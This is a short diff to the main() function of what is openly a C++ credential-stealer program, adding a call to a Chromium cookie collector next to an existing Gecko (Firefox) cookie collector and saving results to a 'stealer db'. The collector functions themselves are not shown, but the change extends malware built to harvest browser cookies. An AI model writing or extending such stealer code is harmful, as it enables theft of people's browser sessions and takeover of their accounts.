@@ -40,6 +40,9 @@ int main()
 	if(!gecko_cookie_collector(converted_username, stealer_db))
 		std::cout << "Gecko Cookie Collector failed!" << std::endl;
 
+	if (!chromium_cookie_collector(converted_username, stealer_db))
+		std::cout << "Chromium Cookie Collector failed!" << std::endl;
+
 	std::cout << "Stealer db saved: " << stealer_db << std::endl;
 	return 0;
 }
